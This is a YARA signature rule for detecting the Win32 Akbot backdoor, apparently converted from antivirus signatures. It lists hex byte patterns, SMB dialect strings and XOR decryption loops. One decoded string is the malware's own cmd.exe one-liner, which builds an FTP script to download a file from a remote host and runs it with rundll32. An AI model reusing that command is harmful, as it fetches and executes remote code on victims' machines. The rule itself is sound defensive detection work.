
rule Backdoor_Win32_Akbot{
	meta:
		description = "Backdoor:Win32/Akbot,SIGNATURE_TYPE_PEHSTR_EXT,11 00 0f 00 0a 00 00 05 00 "
		
	strings :
		$a_01_0 = {2e 64 6c 6c 00 73 74 61 72 74 00 } //05 00 
		$a_01_1 = {63 6d 64 2e 65 78 65 20 2f 43 20 65 63 68 6f 20 6f 70 65 6e 20 25 73 20 25 68 75 3e 78 26 65 63 68 6f 20 75 73 65 72 20 78 20 78 3e 3e 78 26 65 63 68 6f 20 62 69 6e 3e 3e 78 26 65 63 68 6f 20 67 65 74 20 25 73 3e 3e 78 26 65 63 68 6f 20 62 79 65 3e 3e 78 26 66 74 70 2e 65 78 65 20 2d 6e 20 2d 73 3a 78 26 64 65 6c 20 78 26 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 25 73 2c 73 74 61 72 74 } //01 00  cmd.exe /C echo open %s %hu>x&echo user x x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&ftp.exe -n -s:x&del x&rundll32.exe %s,start
		$a_00_2 = {50 43 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 } //01 00  PC NETWORK PROGRAM 1.0
		$a_01_3 = {4c 41 4e 4d 41 4e 31 2e 30 } //01 00  LANMAN1.0
		$a_00_4 = {4c 41 4e 4d 41 4e 32 2e 31 } //01 00  LANMAN2.1
		$a_01_5 = {57 69 6e 64 6f 77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70 73 20 33 2e 31 61 } //01 00  Windows for Workgroups 3.1a
		$a_01_6 = {43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 } //0a 00  CACACACACACACACACACACACACACACA
		$a_03_7 = {7c 02 eb 1e 8b 45 90 01 01 03 45 90 01 01 0f be 08 8b 55 90 01 01 03 55 f8 90 01 01 be 02 33 c1 8b 4d 90 01 01 03 4d 90 01 01 88 01 eb 90 00 } //0a 00 
		$a_03_8 = {7c 02 eb 1a 8b 4d 90 01 01 03 4d 90 01 01 8b 55 90 01 01 03 55 90 01 01 8a 01 32 02 8b 4d 90 01 01 03 4d 90 01 01 88 01 eb 90 00 } //0a 00 
		$a_03_9 = {33 d2 85 c9 7e 10 3b 55 90 01 01 7d 0b 8a 04 1e 30 04 3a 42 3b d1 7c f0 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}